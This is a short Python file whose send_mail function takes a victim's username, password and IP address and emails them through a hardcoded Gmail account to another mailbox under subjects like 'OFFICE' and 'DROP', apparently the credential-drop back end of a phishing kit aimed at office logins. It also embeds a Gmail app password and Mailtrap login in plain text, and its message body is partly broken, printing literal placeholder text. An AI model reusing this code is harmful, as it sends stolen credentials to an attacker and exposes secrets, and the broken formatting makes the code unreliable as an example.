import smtplib
from email.mime.text import MIMEText
#from flask import Flask, request

#ip_address = request.remote_addr
def send_mail(username, password, ip_address):
    # port = (25)
    # smtp_server = "smtp.mailtrap.io"
    # login = '6187c074a489f4'
    # password = '484e76cb9fe71d'
    # message = f"<h3>New Feedback Submission</h3><ul><li>Username: {username} </li><li>Password: {password} </li><li>IP Address: {ip_address} </li></ul>"
    
    # sender_email = "email@example.com"
    # receiver_email = "email2@example.com"
    # msg = MIMEText(message, "html")
    # msg["Subject"] = "DROP"
    # msg["From"] = sender_email
    # msg["To"] = receiver_email
    #Send Email
    EMAIL_ADDRESS = "busganda@gmail.com"
    EMAIL_PASSWORD = "mkarxgucgtnvymys"
    with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.ehlo()

        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        subject = f"OFFICE{ip_address}"
        body = "The username is: + (username)+ \n password is: +(password)+ \n ip: https://www.ip2location.com/demo/+(ip_address)"
        msg = f"Subject: {subject}\n\n{body}"
        smtp.sendmail("busganda@gmail.com", "chibyx395@gmail.com", msg)

    # with smtplib.SMTP(smtp_server, port) as server:
    #     server.login(login, password)
    #     server.sendmail(sender_email, receiver_email, msg.as_string())

